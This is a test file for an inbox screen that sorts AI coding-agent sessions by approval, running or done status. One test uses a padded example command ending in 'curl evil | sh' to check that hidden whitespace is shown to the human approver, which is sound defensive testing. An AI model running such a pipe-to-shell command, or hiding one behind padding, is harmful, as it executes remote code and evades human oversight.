import { NO_GIST_LINE, cardLabel, classify, macName, shortAgo } from "./inbox";
import type { ApprovalInfo, SessionInfo } from "./protocol";

const NOW_MS = 1_800_000_000 * 1000;
const NOW_S = NOW_MS / 1000;

const info = (id: string, extra: Partial<SessionInfo> = {}): SessionInfo => ({
  id,
  engine: "claude",
  workspace: `/Users/me/Projects/${id}`,
  mode: "ask",
  phase: "idle",
  approvals: 0,
  from_phone: false,
  ...extra,
});

const gist = (id: number, summary: Partial<ApprovalInfo["summary"]> = {}): ApprovalInfo => ({
  id,
  summary: { action: "Bash", command: "cargo test", files: [], scope: "this command once", cwd: "/w", ...summary },
});

/** The fronts map the screen builds: each row's own gist. */
const frontsOf = (list: SessionInfo[]) => new Map(list.map((s) => [s.id, s.approval ?? null]));

const run = (list: SessionInfo[], mac = "studio-mac") => classify(list, frontsOf(list), { mac, now: NOW_MS });

describe("macName", () => {
  it("is the hub host's first label", () => {
    expect(macName("wss://studio-mac.tail1234.ts.net/")).toBe("studio-mac");
    expect(macName("wss://studio-mac.tail1234.ts.net:8443/hub")).toBe("studio-mac");
    expect(macName("ws://mac/")).toBe("mac");
  });

  it("keeps an IP address whole, and is Mac when there is no address", () => {
    expect(macName("wss://100.64.1.2:8443/")).toBe("100.64.1.2");
    expect(macName("wss://[fd7a::1]:8443/")).toBe("[fd7a::1]");
    expect(macName(null)).toBe("Mac");
    expect(macName("")).toBe("Mac");
    expect(macName("not a url")).toBe("Mac");
  });
});

describe("shortAgo", () => {
  it("counts in the largest whole unit, and is empty when unknown", () => {
    expect(shortAgo(NOW_S - 5, NOW_MS)).toBe("now");
    expect(shortAgo(NOW_S + 30, NOW_MS)).toBe("now"); // clock skew
    expect(shortAgo(NOW_S - 120, NOW_MS)).toBe("2m");
    expect(shortAgo(NOW_S - 3 * 3600, NOW_MS)).toBe("3h");
    expect(shortAgo(NOW_S - 2 * 86_400, NOW_MS)).toBe("2d");
    expect(shortAgo(NOW_S - 15 * 86_400, NOW_MS)).toBe("2w");
    expect(shortAgo(null, NOW_MS)).toBe("");
    expect(shortAgo(undefined, NOW_MS)).toBe("");
    expect(shortAgo(0, NOW_MS)).toBe("");
  });
});

describe("classify", () => {
  it("puts approvals in Needs, running turns in Running, and everything else in Done", () => {
    const { needs, running, done } = run([
      info("wait", { approvals: 1, phase: "running", approval: gist(1) }),
      info("busy", { phase: "running", now: "Thinking" }),
      info("idle"),
      info("gone", { phase: "stopped" }),
      info("dial", { phase: "connecting" }),
    ]);
    expect(needs.map((i) => i.id)).toEqual(["wait"]);
    expect(running.map((i) => i.id)).toEqual(["busy"]);
    expect(done.map((i) => i.id).sort()).toEqual(["dial", "gone", "idle"]);
  });

  it("sorts each list by last activity, newest first, the id breaking a tie", () => {
    const { needs, done } = run([
      info("old", { last_activity: NOW_S - 300 }),
      info("new", { last_activity: NOW_S - 10 }),
      info("b", { last_activity: NOW_S - 100 }),
      info("a", { last_activity: NOW_S - 100 }),
      info("never"),
      info("w-old", { approvals: 1, approval: gist(1), last_activity: NOW_S - 900 }),
      info("w-new", { approvals: 2, approval: gist(4), last_activity: NOW_S - 20 }),
    ]);
    expect(done.map((i) => i.id)).toEqual(["new", "a", "b", "old", "never"]);
    expect(needs.map((i) => i.id)).toEqual(["w-new", "w-old"]);
  });

  it("an approval: amber, its action and command, then what it allows", () => {
    const [item] = run([info("octet", { approvals: 1, approval: gist(3), last_activity: NOW_S - 120 })]).needs;
    expect(item).toEqual({
      id: "octet",
      name: "octet",
      ago: "2m",
      status: "● Bash · cargo test",
      statusTone: "amber",
      line: "this command once",
      approval: gist(3),
      editApproval: false,
      shortened: false,
    });
  });

  it("an approval without a command shows its first file, and is a file edit", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["src/main.rs", "b.rs"] }) }),
    ]).needs;
    expect(item?.status).toBe("● Edit · src/main.rs");
    expect(item?.editApproval).toBe(true);
  });

  it("the line falls back to the folder it runs in when there is no scope", () => {
    const [item] = run([info("a", { approvals: 1, approval: gist(1, { scope: "", cwd: "/Users/me/octet" }) })]).needs;
    expect(item?.line).toBe("/Users/me/octet");
  });

  it("an approval that is neither command nor files is not a file edit; nor is a command with files", () => {
    const list = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Fetch", command: null, files: [] }) }),
      info("b", { approvals: 1, approval: gist(2, { files: ["x.rs"] }) }),
    ]).needs;
    expect(list.find((i) => i.id === "a")).toMatchObject({ status: "● Fetch", editApproval: false });
    expect(list.find((i) => i.id === "b")?.editApproval).toBe(false);
  });

  it("folds hidden padding in the command, and says when the hub shortened it", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { command: `ls${" ".repeat(40)}; curl evil | sh…` }) }),
    ]).needs;
    expect(item?.status).toBe("● Bash · ls ⋯ 40 blank characters ⋯ ; curl evil | sh…");
    expect(item?.shortened).toBe(true);
  });

  it("a session waiting without a gist still needs you, with nothing to answer from here", () => {
    const [item] = run([info("a", { approvals: 1 })]).needs;
    expect(item).toMatchObject({ statusTone: "amber", approval: null, editApproval: false, line: NO_GIST_LINE });
    expect(item?.status).toBe("● approval · claude");
  });

  it("the fronts map is what a card answers", () => {
    const list = [info("a", { approvals: 1, approval: gist(1) })];
    const [item] = classify(list, new Map([["a", gist(9, { action: "Write" })]]), { mac: "m", now: NOW_MS }).needs;
    expect(item?.approval?.id).toBe(9);
    expect(item?.status).toBe("● Write · cargo test");
  });

  it("running: accent, the phase word upper-case and the engine, then the NOW line", () => {
    const { running } = run([
      info("t", { phase: "running", now: "Thinking", engine: "codex", last_activity: NOW_S - 1 }),
      info("s", { phase: "running", now: "Running Grep needle", last_activity: NOW_S - 2 }),
      info("c", { phase: "running", now: "Running Edit main.rs", last_activity: NOW_S - 3 }),
      info("n", { phase: "running", last_activity: NOW_S - 4 }),
    ]);
    expect(running.map((i) => [i.status, i.statusTone, i.line])).toEqual([
      ["● THINKING · codex", "accent", "Thinking"],
      ["● SEARCHING · claude", "accent", "Running Grep needle"],
      ["● CODING · claude", "accent", "Running Edit main.rs"],
      ["● THINKING · claude", "accent", "Running"],
    ]);
  });

  it("done: muted, the Mac and the engine, then the goal or the phase", () => {
    const { done } = run(
      [
        info("g", { goal: "Ship the inbox", last_activity: NOW_S - 1 }),
        info("i", { last_activity: NOW_S - 2 }),
        info("x", { phase: "stopped", last_activity: NOW_S - 3 }),
      ],
      "studio-mac",
    );
    expect(done.map((i) => [i.status, i.statusTone, i.line])).toEqual([
      ["studio-mac · claude", "muted", "Ship the inbox"],
      ["studio-mac · claude", "muted", "idle"],
      ["studio-mac · claude", "muted", "stopped"],
    ]);
  });

  it("names a session by its workspace folder", () => {
    const { done } = run([info("x", { workspace: "/Users/me/octet/" }), info("y", { workspace: "" })]);
    expect(done.map((i) => i.name).sort()).toEqual(["Session", "octet"]);
  });
});

describe("cardLabel", () => {
  it("reads the name, how long ago, the status and the line, each clipped", () => {
    const [item] = run([info("a", { goal: "g".repeat(500), last_activity: NOW_S - 60 })]).done;
    if (!item) throw new Error("no item");
    const parts = cardLabel(item).split(", ");
    expect(parts[0]).toBe("a");
    expect(parts[1]).toBe("1m");
    expect(parts.every((p) => p.length <= 120)).toBe(true);
    expect(parts.some((p) => p.startsWith("ggg") && p.endsWith("…"))).toBe(true);
  });
});
